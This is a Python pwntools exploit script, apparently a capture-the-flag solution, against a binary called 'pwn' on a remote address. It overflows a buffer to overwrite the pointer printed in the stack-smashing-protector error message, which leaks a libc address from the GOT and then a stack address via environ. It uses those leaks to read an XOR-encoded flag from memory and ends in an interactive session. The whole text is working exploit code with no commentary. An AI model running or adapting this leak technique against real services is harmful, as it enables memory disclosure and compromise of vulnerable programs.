from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#sh = process("./pwn")
sh = remote("172.10.0.4",10085)
elf = ELF("pwn")
#gdb.attach(sh, "b*0x400B8B")
sh.recvuntil("ame?")
sh.send("\x00")
sh.recvuntil("nt to do?")
payload = "a" * 0x128
payload += p64(elf.got['puts'])
sh.sendline(payload)
sh.recvuntil("tected ***: ")
addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("addr:"+hex(addr))
libcbase = addr - libc.symbols['puts']
log.info("libcbase:"+hex(libcbase))


sh.recvuntil("ame?")
sh.send("\x00")
sh.recvuntil("nt to do?")
payload = "a" * 0x128
payload += p64(libcbase + libc.symbols['environ'])
sh.sendline(payload)
sh.recvuntil("tected ***: ")
addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("addr:"+hex(addr))

target = addr - 0x178
sh.recvuntil("ame?")
sh.send("\x00")
sh.recvuntil("id is: ")
xor = int(sh.recvuntil("\n", drop = True),10)
log.info("xor:"+str(xor))
sh.recvuntil("nt to do?")
payload = "a" * 0x128
payload += p64(target)
sh.sendline(payload)
sh.recvuntil("tected ***: ")
data = sh.recvuntil("terminated", drop=True)
print(data)
flag = ""
for i in data:
	try:
		flag += chr(ord(i) ^ xor)
	except:
		continue
print(flag)


sh.interactive()
